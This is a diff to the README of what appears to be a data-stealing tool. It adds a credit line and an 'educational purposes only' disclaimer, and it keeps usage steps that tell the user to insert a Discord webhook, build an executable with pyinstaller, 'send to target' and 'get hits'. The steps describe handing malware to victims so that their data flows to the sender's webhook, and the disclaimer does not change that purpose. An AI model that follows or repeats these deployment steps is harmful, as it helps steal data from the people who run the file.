@@ -43,10 +43,17 @@
 
 
 ### How to Use
-
 1. Put your Discord webhook URL in the script where it says `WEBHOOK = "yourwebhookhere"`
 2. build with pyinstaller
 3. send to target
 4. get hits
 
 
+### special Thanks
+ - special thanks to @idontlikebyfron for making the logo
+
+
+### legal stuff
+ > for educational purposes only and i am not responsible for any misuse, damage, or illegal activity caused by this.
+ > use at ur own risk. any actions taken by with this software are solely the responsibility of the user.
+ > by using this tool you agree that i am not liable for any consequences. 
